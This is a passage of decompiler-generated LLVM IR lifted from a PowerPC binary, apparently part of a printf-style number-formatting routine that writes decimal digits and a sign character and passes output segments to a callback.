  %v3_100106dc = zext i8 %v2_100106dc to i32
  store i32 %v3_100106dc, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_100106ec, label %dec_label_pc_1001074c, label %dec_label_pc_100106f0

dec_label_pc_100106f0:                            ; preds = %dec_label_pc_100106bc
  %v0_100106f0 = load i32, i32* %r10.global-to-local, align 4
  %v2_100106f0 = icmp slt i32 %v0_100106f0, %v2_100106d8
  %v4_100106f0 = icmp eq i32 %v0_100106f0, %v2_100106d8
  store i1 %v2_100106f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100106f0, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_100106f0, label %dec_label_pc_10010744, label %dec_label_pc_10010704

dec_label_pc_10010704:                            ; preds = %dec_label_pc_100106f0
  %v2_10010704 = sub i32 %v0_100106f0, %v2_100106d8
  store i32 %v2_10010704, i32* %r0.global-to-local, align 4
  %v4_10010704 = icmp sgt i32 %v2_10010704, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_10010704, label %dec_label_pc_10010720, label %dec_label_pc_10010710

dec_label_pc_10010710:                            ; preds = %dec_label_pc_10010704
  %v2_10010714 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10010714, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10010768

dec_label_pc_10010720:                            ; preds = %dec_label_pc_10010704
  store i32 ptrtoint (i32* @global_var_1001d803.917 to i32), i32* %r9.global-to-local, align 4
  %v2_1001072c = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1001072c, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_10010768

dec_label_pc_10010744:                            ; preds = %dec_label_pc_100106f0
  %v0_10010744 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10010744, label %dec_label_pc_10010754, label %dec_label_pc_10010748

dec_label_pc_10010748:                            ; preds = %dec_label_pc_10010744
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001074c

dec_label_pc_1001074c:                            ; preds = %dec_label_pc_100106bc, %dec_label_pc_10010748
  %v2_1001074c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1001074c, i32* @r8, align 4
  br label %dec_label_pc_10010768

dec_label_pc_10010754:                            ; preds = %dec_label_pc_10010744
  %v2_10010754 = sub i32 %v2_100106d8, %v0_100106f0
  store i32 %v2_10010754, i32* %r11.global-to-local, align 4
  %v2_1001075c = add i32 %v0_100106f0, %v1_100106d0
  store i32 %v2_1001075c, i32* %r6.global-to-local, align 4
  %v2_10010760 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10010760, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010768

dec_label_pc_10010768:                            ; preds = %dec_label_pc_1001074c, %dec_label_pc_10010720, %dec_label_pc_10010710, %dec_label_pc_10010754
  %v1_10010794 = phi i32 [ %v2_1001074c, %dec_label_pc_1001074c ], [ %v2_1001072c, %dec_label_pc_10010720 ], [ %v2_10010714, %dec_label_pc_10010710 ], [ %v2_10010760, %dec_label_pc_10010754 ]
  %v0_10010774 = phi i32 [ %v2_100106d8, %dec_label_pc_1001074c ], [ 0, %dec_label_pc_10010720 ], [ 0, %dec_label_pc_10010710 ], [ %v2_10010754, %dec_label_pc_10010754 ]
  %v3_10010768 = load i32, i32* %v2_10010338, align 4
  store i32 %v3_10010768, i32* %r0.global-to-local, align 4
  %v1_1001076c = and i32 %v3_10010768, 16
  store i32 %v1_1001076c, i32* %r9.global-to-local, align 4
  %v3_1001076c = icmp eq i32 %v1_1001076c, 0
  br i1 %v3_1001076c, label %dec_label_pc_10010774, label %dec_label_pc_1001078c

dec_label_pc_10010774:                            ; preds = %dec_label_pc_10010768
  %v1_10010774 = icmp slt i32 %v0_10010774, 0
  %v3_10010774 = icmp eq i32 %v0_10010774, 0
  store i1 %v1_10010774, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010774, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010774, label %dec_label_pc_1001077c, label %dec_label_pc_1001078c

dec_label_pc_1001077c:                            ; preds = %dec_label_pc_10010774
  %v0_1001077c = load i32, i32* %r31.global-to-local, align 4
  %v1_1001077c = icmp slt i32 %v0_1001077c, 103
  %v3_1001077c = icmp eq i32 %v0_1001077c, 103
  store i1 %v1_1001077c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001077c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001077c, label %dec_label_pc_100107ac, label %dec_label_pc_10010784

dec_label_pc_10010784:                            ; preds = %dec_label_pc_1001077c
  %v0_10010784 = load i32, i32* %r30.global-to-local, align 4
  %v1_10010784 = icmp slt i32 %v0_10010784, 0
  %v3_10010784 = icmp eq i32 %v0_10010784, 0
  store i1 %v1_10010784, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010784, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_10010784, 1
  br i1 %tmp79, label %dec_label_pc_100107ac, label %dec_label_pc_1001078c

dec_label_pc_1001078c:                            ; preds = %dec_label_pc_10010774, %dec_label_pc_10010768, %dec_label_pc_10010784
  %v2_10010794 = inttoptr i32 %v1_10010794 to i32*
  store i32 112, i32* %v2_10010794, align 4
  store i32 ptrtoint (i32* @global_var_1001d810.918 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100107a0 = load i32, i32* @r8, align 4
  %v2_100107a0 = add i32 %v1_100107a0, 8
  %v3_100107a0 = inttoptr i32 %v2_100107a0 to i32*
  store i32 ptrtoint (i32* @global_var_1001d810.918 to i32), i32* %v3_100107a0, align 4
  %v0_100107a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100107a4 = load i32, i32* @r8, align 4
  %v2_100107a4 = add i32 %v1_100107a4, 4
  %v3_100107a4 = inttoptr i32 %v2_100107a4 to i32*
  store i32 %v0_100107a4, i32* %v3_100107a4, align 4
  %v0_100107a8 = load i32, i32* @r8, align 4
  %v1_100107a8 = add i32 %v0_100107a8, 12
  store i32 %v1_100107a8, i32* @r8, align 4
  br label %dec_label_pc_100107ac

dec_label_pc_100107ac:                            ; preds = %dec_label_pc_10010784, %dec_label_pc_1001077c, %dec_label_pc_1001078c
  %v1_100107bc = phi i32 [ %v1_10010794, %dec_label_pc_10010784 ], [ %v1_10010794, %dec_label_pc_1001077c ], [ %v1_100107a8, %dec_label_pc_1001078c ]
  %v0_100107ac = load i32, i32* %r10.global-to-local, align 4
  %v1_100107ac = add i32 %v0_100107ac, 1
  store i32 %v1_100107ac, i32* %r10.global-to-local, align 4
  %v4_100107ac = icmp eq i32 %v1_100107ac, 0
  br i1 %v4_100107ac, label %dec_label_pc_100107d4, label %dec_label_pc_100107b4

dec_label_pc_100107b4:                            ; preds = %dec_label_pc_100107ac
  %v1_100107b4 = sub i32 -1, %v0_100107ac
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_100107bc = add i32 %v1_100107bc, 4
  %v3_100107bc = inttoptr i32 %v2_100107bc to i32*
  store i32 %v1_100107b4, i32* %v3_100107bc, align 4
  store i32 ptrtoint (i32* @global_var_1001d803.917 to i32), i32* %r9.global-to-local, align 4
  %v0_100107c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100107c8 = load i32, i32* @r8, align 4
  %v2_100107c8 = inttoptr i32 %v1_100107c8 to i32*
  store i32 %v0_100107c8, i32* %v2_100107c8, align 4
  %v0_100107cc = load i32, i32* %r9.global-to-local, align 4
  %v1_100107cc = load i32, i32* @r8, align 4
  %v2_100107cc = add i32 %v1_100107cc, 8
  %v3_100107cc = inttoptr i32 %v2_100107cc to i32*
  store i32 %v0_100107cc, i32* %v3_100107cc, align 4
  %v0_100107d0 = load i32, i32* @r8, align 4
  %v1_100107d0 = add i32 %v0_100107d0, 12
  store i32 %v1_100107d0, i32* @r8, align 4
  br label %dec_label_pc_100107d4

dec_label_pc_100107d4:                            ; preds = %dec_label_pc_100107ac, %dec_label_pc_100107b4
  %v1_100107e0 = phi i32 [ %v1_100107bc, %dec_label_pc_100107ac ], [ %v1_100107d0, %dec_label_pc_100107b4 ]
  %v0_100107d4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100107d4 = icmp slt i32 %v0_100107d4, 0
  %v3_100107d4 = icmp eq i32 %v0_100107d4, 0
  store i1 %v1_100107d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100107d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100107d4, label %dec_label_pc_100107f0, label %dec_label_pc_100107dc

dec_label_pc_100107dc:                            ; preds = %dec_label_pc_100107d4
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_100107e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_100107e0 = add i32 %v1_100107e0, 8
  %v3_100107e0 = inttoptr i32 %v2_100107e0 to i32*
  store i32 %v0_100107e0, i32* %v3_100107e0, align 4
  %v0_100107e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100107e4 = load i32, i32* @r8, align 4
  %v2_100107e4 = inttoptr i32 %v1_100107e4 to i32*
  store i32 %v0_100107e4, i32* %v2_100107e4, align 4
  %v0_100107e8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100107e8 = load i32, i32* @r8, align 4
  %v2_100107e8 = add i32 %v1_100107e8, 4
  %v3_100107e8 = inttoptr i32 %v2_100107e8 to i32*
  store i32 %v0_100107e8, i32* %v3_100107e8, align 4
  %v0_100107ec = load i32, i32* @r8, align 4
  %v1_100107ec = add i32 %v0_100107ec, 12
  store i32 %v1_100107ec, i32* @r8, align 4
  br label %dec_label_pc_100107f0

dec_label_pc_100107f0:                            ; preds = %dec_label_pc_100107d4, %dec_label_pc_100107dc
  %v1_10010818 = phi i32 [ %v1_100107e0, %dec_label_pc_100107d4 ], [ %v1_100107ec, %dec_label_pc_100107dc ]
  %v0_100107f0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100107f0 = icmp slt i32 %v0_100107f0, 103
  %v3_100107f0 = icmp eq i32 %v0_100107f0, 103
  store i1 %v1_100107f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100107f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100107f0, label %dec_label_pc_100107f8, label %dec_label_pc_10010804

dec_label_pc_100107f8:                            ; preds = %dec_label_pc_100107f0
  %v3_100107f8 = load i32, i32* %v2_10010338, align 4
  store i32 %v3_100107f8, i32* %r0.global-to-local, align 4
  %v1_100107fc = and i32 %v3_100107f8, 16
  store i32 %v1_100107fc, i32* %r9.global-to-local, align 4
  %v3_100107fc = icmp eq i32 %v1_100107fc, 0
  br i1 %v3_100107fc, label %dec_label_pc_10010830, label %dec_label_pc_10010804

dec_label_pc_10010804:                            ; preds = %dec_label_pc_100107f0, %dec_label_pc_100107f8
  %v0_10010804 = load i32, i32* %r10.global-to-local, align 4
  %v1_10010804 = load i32, i32* %r11.global-to-local, align 4
  %v2_10010804 = sub i32 %v1_10010804, %v0_10010804
  store i32 %v2_10010804, i32* %r9.global-to-local, align 4
  %v1_10010808 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010808 = icmp sgt i32 %v1_10010808, %v2_10010804
  %v4_10010808 = icmp eq i32 %v1_10010808, %v2_10010804
  store i1 %v2_10010808, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10010808, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10010808, label %dec_label_pc_10010810, label %dec_label_pc_10010830

dec_label_pc_10010810:                            ; preds = %dec_label_pc_10010804
  %v2_10010810 = sub i32 %v1_10010808, %v2_10010804
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10010818 = add i32 %v1_10010818, 4
  %v3_10010818 = inttoptr i32 %v2_10010818 to i32*
  store i32 %v2_10010810, i32* %v3_10010818, align 4
  store i32 ptrtoint (i32* @global_var_1001d803.917 to i32), i32* %r9.global-to-local, align 4
  %v0_10010824 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010824 = load i32, i32* @r8, align 4
  %v2_10010824 = inttoptr i32 %v1_10010824 to i32*
  store i32 %v0_10010824, i32* %v2_10010824, align 4
  %v0_10010828 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010828 = load i32, i32* @r8, align 4
  %v2_10010828 = add i32 %v1_10010828, 8
  %v3_10010828 = inttoptr i32 %v2_10010828 to i32*
  store i32 %v0_10010828, i32* %v3_10010828, align 4
  %v0_1001082c = load i32, i32* @r8, align 4
  %v1_1001082c = add i32 %v0_1001082c, 12
  store i32 %v1_1001082c, i32* @r8, align 4
  br label %dec_label_pc_10010830

dec_label_pc_10010830:                            ; preds = %dec_label_pc_10010804, %dec_label_pc_100107f8, %dec_label_pc_10010810
  %v1_100108c437 = phi i32 [ %v1_10010818, %dec_label_pc_10010804 ], [ %v1_10010818, %dec_label_pc_100107f8 ], [ %v1_1001082c, %dec_label_pc_10010810 ]
  %v0_10010830 = load i32, i32* %r4.global-to-local, align 4
  %v1_10010830 = icmp slt i32 %v0_10010830, 102
  %v3_10010830 = icmp eq i32 %v0_10010830, 102
  store i1 %v1_10010830, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010830, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010830, label %dec_label_pc_100108b8, label %dec_label_pc_10010838

dec_label_pc_10010838:                            ; preds = %dec_label_pc_10010830
  %v0_10010838 = load i32, i32* @r7, align 4
  %v1_10010838 = icmp slt i32 %v0_10010838, 0
  %v3_10010838 = icmp eq i32 %v0_10010838, 0
  store i1 %v1_10010838, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010838, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_10010838, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_10010838, -1
  br i1 %tmp80, label %dec_label_pc_10010854, label %dec_label_pc_1001084c

dec_label_pc_1001084c:                            ; preds = %dec_label_pc_10010838
  %v1_1001084c = sub i32 0, %v0_10010838
  store i32 %v1_1001084c, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10010854

dec_label_pc_10010854:                            ; preds = %dec_label_pc_10010838, %dec_label_pc_1001084c
  %v0_1001086831 = phi i32 [ %v0_10010838, %dec_label_pc_10010838 ], [ %v1_1001084c, %dec_label_pc_1001084c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10010858 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_10010858, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010868

dec_label_pc_10010868:                            ; preds = %dec_label_pc_10010868.backedge, %dec_label_pc_10010854
  %v2_10010888 = phi i32 [ %v3_10010888, %dec_label_pc_10010868.backedge ], [ %v2_10010858, %dec_label_pc_10010854 ]
  %v0_1001086c = phi i32 [ %v0_1001086c.pre, %dec_label_pc_10010868.backedge ], [ 2, %dec_label_pc_10010854 ]
  %v1_10010868 = phi i32 [ %v1_10010868.pre, %dec_label_pc_10010868.backedge ], [ 10, %dec_label_pc_10010854 ]
  %v1_1001087c = phi i32 [ %v0_10010868.pre, %dec_label_pc_10010868.backedge ], [ %v0_1001086831, %dec_label_pc_10010854 ]
  %v2_10010868 = sdiv i32 %v1_1001087c, %v1_10010868
  store i32 %v2_10010868, i32* %r0.global-to-local, align 4
  %v1_1001086c = add i32 %v0_1001086c, 1
  store i32 %v1_1001086c, i32* @r7, align 4
  %v1_10010870 = icmp slt i32 %v1_1001086c, 3
  %v3_10010870 = icmp eq i32 %v1_1001086c, 3
  store i1 %v1_10010870, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010870, i1* %cr7_eq.global-to-local, align 1
  %v1_10010878 = icmp slt i32 %v2_10010868, 0
  %v2_10010878 = icmp sgt i32 %v2_10010868, 0
  %v3_10010878 = icmp eq i32 %v2_10010868, 0
  store i1 %v1_10010878, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10010878, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10010878, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_10010868, -10
  store i32 %v2_10010868, i32* %r11.global-to-local, align 4
  %v2_1001087c = add i32 %v1_1001087c, 48
  %v1_10010884 = add i32 %v2_1001087c, %tmp81
  store i32 %v1_10010884, i32* %r9.global-to-local, align 4
  %v1_10010888 = trunc i32 %v1_10010884 to i8
  %v3_10010888 = add i32 %v2_10010888, -1
  %v4_10010888 = inttoptr i32 %v3_10010888 to i8*
  store i8 %v1_10010888, i8* %v4_10010888, align 1
  store i32 %v3_10010888, i32* %r10.global-to-local, align 4
  %v0_1001088c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1001088c = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1001088c = or i1 %v0_1001088c, %v1_1001088c
  br i1 %v2_1001088c, label %dec_label_pc_10010868.backedge, label %dec_label_pc_10010890

dec_label_pc_10010868.backedge:                   ; preds = %dec_label_pc_10010868, %dec_label_pc_10010890
  %v0_10010868.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10010868.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1001086c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10010868

dec_label_pc_10010890:                            ; preds = %dec_label_pc_10010868
  %v0_10010890 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10010890, label %dec_label_pc_10010894, label %dec_label_pc_10010868.backedge

dec_label_pc_10010894:                            ; preds = %dec_label_pc_10010890
  %v1_10010894 = add i32 %v2_10010888, -2
  store i32 %v1_10010894, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1001089c = add i32 %v2_10010888, -3
  store i32 %v1_1001089c, i32* %r11.global-to-local, align 4
  %v0_100108a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100108a0 = trunc i32 %v0_100108a0 to i8
  %v4_100108a0 = inttoptr i32 %v1_10010894 to i8*
  store i8 %v1_100108a0, i8* %v4_100108a0, align 1
  %v0_100108a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_100108a4 = trunc i32 %v0_100108a4 to i8
  %v2_100108a4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100108a4 = add i32 %v2_100108a4, -1
  %v4_100108a4 = inttoptr i32 %v3_100108a4 to i8*
  store i8 %v1_100108a4, i8* %v4_100108a4, align 1
  %v0_100108a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100108a8 = load i32, i32* @r8, align 4
  %v2_100108a8 = inttoptr i32 %v1_100108a8 to i32*
  store i32 %v0_100108a8, i32* %v2_100108a8, align 4
  %v0_100108ac = load i32, i32* @r7, align 4
  %v1_100108ac = load i32, i32* @r8, align 4
  %v2_100108ac = add i32 %v1_100108ac, 4
  %v3_100108ac = inttoptr i32 %v2_100108ac to i32*
  store i32 %v0_100108ac, i32* %v3_100108ac, align 4
  %v0_100108b0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100108b0 = load i32, i32* @r8, align 4
  %v2_100108b0 = add i32 %v1_100108b0, 8
  %v3_100108b0 = inttoptr i32 %v2_100108b0 to i32*
  store i32 %v0_100108b0, i32* %v3_100108b0, align 4
  %v0_100108b4 = load i32, i32* @r8, align 4
  %v1_100108b4 = add i32 %v0_100108b4, 12
  store i32 %v1_100108b4, i32* @r8, align 4
  br label %dec_label_pc_100108b8

dec_label_pc_100108b8:                            ; preds = %dec_label_pc_10010830, %dec_label_pc_1001040c, %dec_label_pc_10010894
  %v0_10010934 = phi i32 [ %v1_100108c437, %dec_label_pc_10010830 ], [ %v2_10010418, %dec_label_pc_1001040c ], [ %v1_100108b4, %dec_label_pc_10010894 ]
  %v2_100108b8 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_100108b8, i32* %r9.global-to-local, align 4
  %v1_100108c8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100108bc

dec_label_pc_100108bc:                            ; preds = %dec_label_pc_100108bc, %dec_label_pc_100108b8
  %v1_100108c8 = phi i32 [ %v2_100108c8, %dec_label_pc_100108bc ], [ %v1_100108c8.pre, %dec_label_pc_100108b8 ]
  %v0_100108bc = phi i32 [ %v1_100108c0, %dec_label_pc_100108bc ], [ %v2_100108b8, %dec_label_pc_100108b8 ]
  %v1_100108bc = inttoptr i32 %v0_100108bc to i32*
  %v2_100108bc = load i32, i32* %v1_100108bc, align 4
  store i32 %v2_100108bc, i32* %r0.global-to-local, align 4
  %v1_100108c0 = add i32 %v0_100108bc, 12
  store i32 %v1_100108c0, i32* %r9.global-to-local, align 4
  %v2_100108c4 = icmp ult i32 %v1_100108c0, %v0_10010934
  %v2_100108c8 = sub i32 %v1_100108c8, %v2_100108bc
  store i32 %v2_100108c8, i32* @r28, align 4
  br i1 %v2_100108c4, label %dec_label_pc_100108bc, label %dec_label_pc_100108d0

dec_label_pc_100108d0:                            ; preds = %dec_label_pc_100108bc
  %v4_100108c4 = icmp eq i32 %v1_100108c0, %v0_10010934
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100108c4, i1* %cr7_eq.global-to-local, align 1
  %v3_100108d0 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_10010934, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_100108d0, 0
  %v1_100108e4 = zext i1 %tmp85 to i32
  store i32 %v1_100108e4, i32* %r9.global-to-local, align 4
  %v2_100108e8 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_100108e8, i32* %r0.global-to-local, align 4
  %v2_100108ec = sub i32 %v2_100108c8, %v1_100108e4
  store i32 %v2_100108ec, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_100108ec, 1
  br i1 %tmp82, label %dec_label_pc_10010958, label %dec_label_pc_100108fc

dec_label_pc_100108fc:                            ; preds = %dec_label_pc_100108d0
  %v3_100108fc = load i32, i32* %v2_10010338, align 4
  store i32 %v3_100108fc, i32* %r0.global-to-local, align 4
  %v1_10010900 = and i32 %v3_100108fc, 8
  store i32 %v1_10010900, i32* @r7, align 4
  %v3_10010900 = icmp eq i32 %v1_10010900, 0
  br i1 %v3_10010900, label %dec_label_pc_10010924, label %dec_label_pc_10010908

dec_label_pc_10010908:                            ; preds = %dec_label_pc_100108fc
  %v1_1001090c = add i32 %v0_10010934, 12
  store i32 %v1_1001090c, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1001d803.917 to i32), i32* %r9.global-to-local, align 4
  %v2_10010914 = inttoptr i32 %v0_10010934 to i32*
  store i32 160, i32* %v2_10010914, align 4
  %v0_10010918 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010918 = load i32, i32* @r8, align 4
  %v2_10010918 = add i32 %v1_10010918, 4
  %v3_10010918 = inttoptr i32 %v2_10010918 to i32*
  store i32 %v0_10010918, i32* %v3_10010918, align 4
  %v0_1001091c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001091c = load i32, i32* @r8, align 4
  %v2_1001091c = add i32 %v1_1001091c, 8
  %v3_1001091c = inttoptr i32 %v2_1001091c to i32*
  store i32 %v0_1001091c, i32* %v3_1001091c, align 4
  br label %dec_label_pc_10010958

dec_label_pc_10010924:                            ; preds = %dec_label_pc_100108fc
  %v1_10010924 = add i32 %tmp, 16
  %v2_10010924 = inttoptr i32 %v1_10010924 to i32*
  %v3_10010924 = load i32, i32* %v2_10010924, align 4
  store i32 %v3_10010924, i32* %r0.global-to-local, align 4
  %v1_10010928 = icmp slt i32 %v3_10010924, 48
  %v3_10010928 = icmp eq i32 %v3_10010924, 48
  store i1 %v1_10010928, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010928, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010928, label %dec_label_pc_10010930, label %dec_label_pc_1001094c

dec_label_pc_10010930:                            ; preds = %dec_label_pc_10010924
  %v3_10010930 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_10010934, i32* @r30, align 4
  %v2_10010938 = add i32 %v3_10010930, %v2_100108ec
  store i32 %v2_10010938, i32* %r0.global-to-local, align 4
  store i32 %v2_10010938, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10010958

dec_label_pc_10010944:                            ; preds = %dec_label_pc_10010960
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_10010994

dec_label_pc_1001094c:                            ; preds = %dec_label_pc_10010924
  store i32 %v2_100108c8, i32* %r0.global-to-local, align 4
  store i32 %v0_10010934, i32* @r30, align 4
  br label %dec_label_pc_10010958

dec_label_pc_10010958:                            ; preds = %dec_label_pc_100108d0, %dec_label_pc_10010930, %dec_label_pc_10010908, %dec_label_pc_1001094c
  store i32 0, i32* @r29, align 4
  %v2_1001095c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1001095c, i32* @r31, align 4
  br label %dec_label_pc_10010960

dec_label_pc_10010960:                            ; preds = %dec_label_pc_10010990, %dec_label_pc_10010958
  %v0_10010970 = phi i32 [ %v1_1001097c, %dec_label_pc_10010990 ], [ %v2_1001095c, %dec_label_pc_10010958 ]
  %v1_10010960 = inttoptr i32 %v0_10010970 to i32*
  %v2_10010960 = load i32, i32* %v1_10010960, align 4
  store i32 %v2_10010960, i32* %r4.global-to-local, align 4
  %v0_10010964 = load i32, i32* @r27, align 4
  store i32 %v0_10010964, i32* %r3.global-to-local, align 4
  %v1_10010968 = add i32 %v0_10010970, 4
  %v2_10010968 = inttoptr i32 %v1_10010968 to i32*
  %v3_10010968 = load i32, i32* %v2_10010968, align 4
  store i32 %v3_10010968, i32* %r5.global-to-local, align 4
  %v0_1001096c = load i32, i32* @r26, align 4
  store i32 %v0_1001096c, i32* %ctr.global-to-local, align 4
  %v1_10010970 = add i32 %v0_10010970, 8
  %v2_10010970 = inttoptr i32 %v1_10010970 to i32*
  %v3_10010970 = load i32, i32* %v2_10010970, align 4
  store i32 %v3_10010970, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1001096c)
  %v0_10010978 = load i32, i32* @r31, align 4
  %v1_10010978 = add i32 %v0_10010978, 4
  %v2_10010978 = inttoptr i32 %v1_10010978 to i32*
  %v3_10010978 = load i32, i32* %v2_10010978, align 4
  store i32 %v3_10010978, i32* %r0.global-to-local, align 4
  %v1_1001097c = add i32 %v0_10010978, 12
  store i32 %v1_1001097c, i32* @r31, align 4
  %v0_10010980 = load i32, i32* @r29, align 4
  %v1_10010980 = load i32, i32* %r3.global-to-local, align 4
  %v2_10010980 = add i32 %v1_10010980, %v0_10010980
  store i32 %v2_10010980, i32* @r29, align 4
  %v2_10010984 = icmp slt i32 %v1_10010980, %v3_10010978
  %v4_10010984 = icmp eq i32 %v1_10010980, %v3_10010978
  store i1 %v2_10010984, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10010984, i1* %cr7_eq.global-to-local, align 1
  %v1_10010988 = load i32, i32* @r30, align 4
  %v2_10010988 = icmp ult i32 %v1_1001097c, %v1_10010988
  %v3_10010988 = icmp ugt i32 %v1_1001097c, %v1_10010988
  %v4_10010988 = icmp eq i32 %v1_1001097c, %v1_10010988
  store i1 %v2_10010988, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10010988, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10010988, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10010984, label %dec_label_pc_10010990, label %dec_label_pc_10010944

dec_label_pc_10010990:                            ; preds = %dec_label_pc_10010960
  br i1 %v2_10010988, label %dec_label_pc_10010960, label %dec_label_pc_10010994

dec_label_pc_10010994:                            ; preds = %dec_label_pc_10010990, %dec_label_pc_10010944
  %v0_10010998 = phi i32 [ -1, %dec_label_pc_10010944 ], [ %v2_10010980, %dec_label_pc_10010990 ]
  store i32 %v0_100102e8, i32* %r0.global-to-local, align 4
  store i32 %v0_10010998, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010998

; uselistorder directives
  uselistorder i32 %v0_10010998, { 1, 0 }
  uselistorder i32 %v1_10010980, { 2, 1, 0 }
  uselistorder i32 %v1_1001097c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_10010978, { 1, 0, 2 }
  uselistorder i32 %v0_10010970, { 0, 2, 1 }
  uselistorder i32 %v3_10010924, { 1, 0, 2 }
  uselistorder i32 %v1_100108e4, { 1, 0 }
  uselistorder i32 %v2_100108c8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100108c0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_100108bc, { 1, 0 }
  uselistorder i32 %v0_10010934, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_10010888, { 1, 2, 0 }
  uselistorder i32 %v1_1001086c, { 1, 0, 2 }
  uselistorder i32 %v2_10010868, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_10010838, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_10010808, { 2, 0, 1 }
  uselistorder i32 %v2_10010804, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10010774, { 1, 0 }
  uselistorder i32 %v2_100106d8, { 0, 1, 2, 4, 3, 5 }
